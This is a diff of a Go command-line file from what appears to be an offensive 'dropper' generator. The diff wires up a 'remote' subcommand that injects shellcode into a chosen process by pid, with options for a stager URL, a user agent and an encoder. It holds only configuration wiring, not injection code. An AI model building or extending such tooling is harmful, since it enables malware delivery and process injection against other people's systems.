@@ -3,7 +3,8 @@ package cmd
 import (
 	"log"
 
-	"godropit/internal/gengo"
+	"godropit/internal/godroplib/remote"
+	"godropit/pkg/gengo"
 
 	"github.com/spf13/cobra"
 )
@@ -16,10 +17,30 @@ var remoteCmd = &cobra.Command{
 	Short: "Execute in the remote process",
 	Long:  `Executes in the remote process. Executes shellcode in the specified pid. `,
 	Run: func(cmd *cobra.Command, args []string) {
+		checkImg()
 		if input == "" {
 			log.Fatalln("Please pass shellcode with -i <shellcodefile.bin|PE.exe>")
 		}
-		gengo.NewRemoteDropper(input, output, domain, name, pid, time, false, shared, arch)
+		name = check(name)
+		var remoteDrop gengo.Dropper
+		var Dtype gengo.DtypeRemote
+		var err error
+
+		Dtype.Args = procArgs
+		Dtype.Pid = pid
+		remoteDrop.Delay = time
+		remoteDrop.Arch = arch
+		remoteDrop.Shared = shared
+		remoteDrop.Debug = debug
+
+		remoteDrop.Dtype, err = gengo.GenDTypeRemote(Dtype)
+		if err != nil {
+			log.Fatalln(err)
+		}
+
+		remoteDrop.Dlls, remoteDrop.Inject, remoteDrop.Import, remoteDrop.Extra = remote.SelectRemote()
+
+		gengo.NewDropper(remoteDrop, name, domain, input, output, stagerurl, imgpath, hostname, ua, sgn)
 	},
 }
 
@@ -30,13 +51,6 @@ func init() {
 	remoteCmd.MarkFlagRequired("name")
 	remoteCmd.MarkFlagRequired("out")
 
-	// Here you will define your flags and configuration settings.
-
-	// Cobra supports Persistent Flags which will work for this command
-	// and all subcommands, e.g.:
-	// remoteCmd.PersistentFlags().String("foo", "", "A help for foo")
-
-	// Cobra supports local flags which will only run when this command
-	// is called directly, e.g.:
+	// remote specific flags
 	remoteCmd.Flags().StringVar(&pid, "pid", "0", "Set remote process pid, default is 0")
 }
